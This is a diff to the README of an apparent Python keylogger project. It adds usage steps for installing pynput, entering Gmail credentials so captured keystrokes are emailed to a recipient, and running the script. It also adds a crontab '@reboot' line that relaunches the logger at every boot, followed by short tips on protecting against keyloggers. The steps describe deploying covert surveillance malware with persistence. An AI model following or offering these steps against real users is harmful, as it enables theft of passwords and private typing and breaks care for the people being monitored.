@@ -49,8 +49,46 @@ This project is designed for:
 
 ## Usage
 
-### 1. Clone the repository:
+**1. Clone the repository:**
 ```bash
 git clone https://github.com/yourusername/python-keylogger.git
 cd python-keylogger
+```
+
+**2. Install required libraries:**
+```bash
+pip install pynput
+```
+
+**3. Configure the script:**
+Open the keylogger.py file and update these variables with your email credentials:
+```bash
+expediteur = "your_email@gmail.com"
+mot_de_passe = "your_password"
+destinataire = "recipient_email@gmail.com"
+```
+
+**4. Run the script:**
+```bash
+python3 keylogger.py
+```
+
+**5. (Optional) Add to cron for persistence:**
+Edit /etc/crontab and add the following line:
+```bash
+@reboot python3 /path/to/keylogger.py &
+```
+
+---
+## Security Tips 
+To protect yourself from keyloggers:
+Use reliable antivirus software and keep it updated.
+Monitor active processes and scheduled tasks regularly.
+Enable multi-factor authentication (MFA) on your accounts.
+Be cautious of suspicious emails or software installations.
+
+---
+
+## License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
